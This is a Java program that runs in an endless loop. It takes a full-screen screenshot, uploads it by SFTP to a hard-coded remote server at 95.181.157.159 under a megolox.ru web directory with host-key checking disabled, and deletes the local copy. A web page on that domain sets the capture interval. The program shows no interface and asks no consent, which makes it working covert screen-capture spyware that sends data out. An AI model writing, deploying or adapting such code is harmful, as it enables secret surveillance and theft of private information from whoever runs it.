import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import javax.imageio.ImageIO;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;

public class Main {

  private static final SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HH_mm_ss");
  private static final String remoteHost = "95.181.157.159";
  private static final String username = "";
  private static final String password = "";
  private static final String localFolderName = "C:\\MayningImagesFolder";
  private static final String folderSFTP = "/var/www/vhosts/megolox.ru/httpdocs/mayningImages/";

  public static void main(String[] args) {
    for (; ; ) {
      try {
        File directory = new File(localFolderName);
        if(!directory.exists()){
          directory.mkdir();
        }
        if (directory.exists()) {
          Document doc = Jsoup.connect("https://megolox.ru/mayning/").data("query", "Java").userAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36").cookie("auth", "token").get();
          Elements h1Elements = doc.select("h2");
          String h2 = h1Elements.text();

          Robot robot = new Robot();
          BufferedImage screenShot = robot.createScreenCapture(new Rectangle(
              Toolkit.getDefaultToolkit().getScreenSize()));
          Calendar now = Calendar.getInstance();
          ImageIO.write(screenShot, "JPG", new File(localFolderName + "\\" + formatter.format(now.getTime()) + ".jpg"));
          System.out.println(formatter.format(now.getTime()));
          ChannelSftp channelSftp = setupJsch();
          channelSftp.connect();
          channelSftp.put(localFolderName + "\\" + formatter.format(now.getTime()) + ".jpg",
              folderSFTP + formatter.format(now.getTime()) + ".jpg");
          channelSftp.exit();
          Files.delete(Path.of(localFolderName + "\\" + formatter.format(now.getTime()) + ".jpg"));
          Thread.sleep(Long.parseLong(h2));
        }
      } catch (Exception ex) {
        ex.printStackTrace();
      }
    }
  }

  private static ChannelSftp setupJsch() throws JSchException {
    JSch jsch = new JSch();
    jsch.setKnownHosts("/var/www/vhosts/megolox.ru/httpdocs/mayningImages/");
    Session jschSession = jsch.getSession(username, remoteHost);
    java.util.Properties config = new java.util.Properties();
    config.put("StrictHostKeyChecking", "no");
    jschSession.setConfig(config);
    jschSession.setPassword(password);
    jschSession.connect();
    return (ChannelSftp) jschSession.openChannel("sftp");
  }
}
